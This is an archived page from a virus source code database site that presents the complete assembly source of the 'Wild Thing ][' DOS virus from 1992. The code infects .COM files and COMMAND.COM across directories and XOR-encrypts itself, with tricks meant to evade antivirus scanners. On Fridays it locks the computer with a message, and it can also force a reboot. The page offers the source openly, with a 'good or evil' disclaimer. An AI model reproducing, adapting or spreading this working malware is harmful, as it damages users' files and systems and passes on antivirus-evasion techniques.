<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: wildthg2_asm</title>
<meta name="KEYWORDS" content="wildthg2.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for wildthg2.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
;  Wild Thing ][ Virus
;  (c) Admiral Bailey - YAM
;  Well take a look for yourself.  I forgot what this ancient piece of work
;  does. :)
;****************************************************************************

code    segment public 'code'
        assume  cs:code
        org     100h

start:
        db 0e9h                         ; jump to next command
        dw 0                            ; just use this

virus:
        call    realcode                ; push ip on stack

realcode        proc    near
        pop     bp                      ; will pop ip into bp
        nop                             ; avoid scan as vcl [con] virus
        sub     bp,offset realcode      ; get the loc in file where bov is
        nop                             ; to avoid detection
        call    encrypt_decrypt         ; decrypt the file

encrypt_start   equ     $

        lea     si,[bp+offset oldjump]  ; put the loc of orig jump in si
        mov     di,100h                 ; where we will replace the orig
        push    di                      ; for when we retn from the first
                                        ; call
        movsw                           ; move two bytes
        movsb                           ; move one byte

        lea     dx,[bp+offset dta]      ; offset new dta
        call    set_dta                 ; move to new dta

get_time:
        mov     ah,2ch                  ; get current time
        int     21h                     ;

        cmp     dh,0                    ; is it zero
        je      get_time                ; yup then get another number

        mov     [bp+enc_value],dh       ; save seconds for encryption

        mov     ah,47h                  ; get current dir
        mov     dl,0h                   ; current drive
        lea     si,[bp+offset currentdir] ; where to store it
        int     21h


        call    do_job                  ; stuff like get date ect..

        call    getcommandcom           ; first get the command.com

findfirst:
        mov     ah,4eh                  ; findfirst command
        lea     dx,[bp+offset filespec] ; load loc of filespec in dx
        mov     cx,00000111b           ; find all attributes

findnext:
        int     21h

        jc      change_dir              ; none found then change dir
        lea     dx,[bp+offset dta+1eh]  ; file name loc in dta
        call    infection               ; if found file then open it
        mov     ah,4fh                  ; find next
        jmp     findnext

change_dir:
        lea     dx,[bp+offset directory]; Directory to change to ".."
        mov     ah,3bh                  ; Change dir command
        int     21h                     ; change dir

        jnc     findfirst               ; if cant change dir then quit

quit:
        lea     dx,[bp+offset currentdir] ; original directory
        mov     ah,3bh                  ; change directory
        int     21h

        mov     dx,80h                  ; return the dta to normal
        call    set_dta

        mov     dh,[bp+enc_value]
        cmp     dh,2
        ja      you_know                ; if more than 2 then dont bother

        mov     ah,09h                  ; display string
        lea     dx,[bp+offset messege]  ; loc of string
        int     21h

        mov     cx,0fffeh
messegeloop:
        loop    messegeloop             ; delay for reader

        db      0eah, 00h, 00h, 0ffh, 0ffh ; reboot

you_know:
        retn                            ; return to loc 100h

realcode        endp


infection       proc    near

        push    dx                      ; save asciiz file name

        mov     ax,4300h                ; get file attribs
        int     21h

        jc      quit2

        mov     [bp+offset old_attrib],cx       ; save old attrib

        mov     ax,4301h                ; set file attribs
        xor     cx,cx                   ; set to no attrib
        int     21h                     ; dx already with name
                                        ; old attrib stored in dta 15h
        jc      infect_quit

        mov     ax,3d02h                ; open file for read/write
        int     21h                     ; dx is alread with file name

        xchg    bx,ax                   ; put handle in bx
        jc      infect_quit             ; if error opening then get another

        mov     ax,5700h                ; get file date
        int     21h                     ; return cx:time dx:date

        mov     [bp+offset olddate],dx  ; save date
        mov     [bp+offset oldtime],cx  ; save time

        mov     cx,3                    ; read 1st 3 bytes
        mov     ah,3fh                  ; read file command
        lea     dx, [bp+offset oldjump] ; get loc in file where bov is
        int     21h                     ; read the file

        jc      closefile               ; if error close up and find another
        jmp     continue_infect

quit2:
        jmp     infect_quit

continue_infect:
        push    bx                      ; save this
        mov     bx,[bp+offset dta+1ah]  ; put loc of size into bx
        mov     ax,bx                   ; put what bx points to into ax
        pop     bx                      ; get original bx

;---
; here we check for previous infection...
; thanx go to 40hex-7 article for this method.
;---------

        mov     cx,word ptr [bp+oldjump+1] ; get old jump loc
        add     cx,eof-virus+3          ; convert to size
        cmp     ax,cx                   ; compare

        jz      closefile               ; if equal get another.

        sub     ax,3                    ; calculate where the new jump will
                                        ; jump to
        mov     word ptr [bp+jumploc],ax ; store new jump till later

        xor     ax,ax                   ; beginning of file
        call    move_fp                 ;

        mov     ah,40h                  ; write to file
        mov     cx,3                    ; just first three bytes
        lea     dx,[bp+offset jumpcom]  ; what to write
        int     21h                     ; do it.

        mov     al,02h                  ; set file pointer to eof
        call    move_fp

        call    encrypt_infect

closefile:
        mov     ax,5701h                ; set file date
        mov     cx,[bp+offset oldtime]
        mov     dx,[bp+offset olddate]
        int     21h

        mov     ah,3eh                  ; close file
        int     21h

        pop     dx                      ; get asciiz fname off stack
        mov     ax,4301h                ; set attribs back
        mov     cx,word ptr [bp+offset old_attrib] ; old attrib
        int     21h

        retn

infect_quit:

        pop     dx                      ; just take the asciiz fname off
                                        ; the stack
        retn                            ; return

infection       endp

move_fp proc    near

        mov     ah,42h                  ; move fp ah has value
        xor     cx,cx                   ; clear these
        xor     dx,dx
        int     21h                     ; do it
        retn

move_fp endp

do_job  proc    near

        mov     ah,2ah                  ; get current date
        int     21h                     ; cx=yr dh=month dl=day al=dow

        cmp     al,5                    ; is it a friday
        je      display_messege
        retn

display_messege:
        mov     ah,01h
        mov     cx,2020h
        int     10h                     ; Hide Cursor
        mov     ah,02h                  ; Moves the cursor
        xor     dx,dx                   ;
        int     10h                     ;
        xor     ax,ax                   ; Clears the screen
        int     10h
        mov     ah,09h                  ; display friday messege
        lea     dx,[bp+offset messege2] ; loc of messege
        int     21h                     ;
        ; kill drives here if you want

lock_loop:
        jmp     lock_loop               ; lock the computer

do_job  endp

getcommandcom   proc    near

        mov     ah,4eh                  ; find file
        lea     dx,[bp+offset commandcom] ; 'c:\command.com'
        mov     cx,7h                   ; find all attrib
        int     21h

        jnc     found_command
        retn

found_command:
        lea     dx,[bp+offset commandcom] ; use this and write to it
        call    infection
        retn

getcommandcom   endp

set_dta         proc    near
        mov     ah, 1ah                 ; Set disk transfer address
        int     21h                     ; dx has loc
        retn                            ; return
set_dta         endp


messege         db      'Wild Thing ][ ',13,10,'$'
messege2        db      'It''s Friday... Enjoy the weekend with',13,10
                db      'your computer! [YAM ''92]',13,10,'$'
sig             db      'By: Admiral Bailey [YAM]'
filespec        db      '*.com',0       ; type of files to find
commandcom      db      '\command.com',0 ; loc of command. com
oldjump         db      0cdh, 020h, 0h ; to hold the old jump with jmp
directory       db      '..',0
old_attrib      dw      0h
olddate         dw      0h
oldtime         dw      0h

; encrypt_end     equ     $

encrypt_infect  proc    near
        lea     si,[bp+offset move_begin] ; source is the procedure
        lea     di,[bp+offset workarea] ; dest is the workarea
        mov     cx,move_end-move_begin  ; number of bytes to move
move_loop:
        movsb                           ; move the bytes and loop
        loop    move_loop               ;
        lea     dx,[bp+offset workarea] ; call the procedure in workarea
        call    dx                      ;
        ret

move_begin      equ     $
        lea     dx,[bp+offset encrypt_end]
        call    dx                      ; call the encrypt procedure
        mov     ah,40h                  ; write to file
        mov     cx,eof-virus            ; number of bytes
        lea     dx,[bp+offset virus]    ; where to start
        int     21h
        lea     dx,[bp+offset encrypt_end] ; call encrypt
        call    dx
        ret
move_end        equ     $
encrypt_infect  endp

encrypt_end     equ     $

encrypt_decrypt proc    near
        push    bx
        lea     bx,[bp+encrypt_start]   ; encrypt from here
        mov     cx,encrypt_end-encrypt_start ; length to encrypt
        mov     dh,[bp+enc_value]       ; get the enc value
encrypt_loop:
        mov     ah,[bx]                 ; get word
        xor     ah,dh                   ; xor it
        mov     [bx],ah                 ; put it back
        inc     bx                      ; move to next
        loop    encrypt_loop
        pop     bx
        retn
encrypt_decrypt endp

enc_value       db      0ffh
jumpcom         db      0e9h            ; jump command

eof     equ     $

; here on does not stay in the infected files.  Its just temp here

jumploc         dw      ?               ; holds the new jump

workarea        db      move_end-move_begin dup (0)

currentdir      db      64 dup (0)      ; buffer for current dir

dta             db      42 dup (?)      ; holds dta


code    ends

        end     start



</textarea></td></tr></table></body></html>
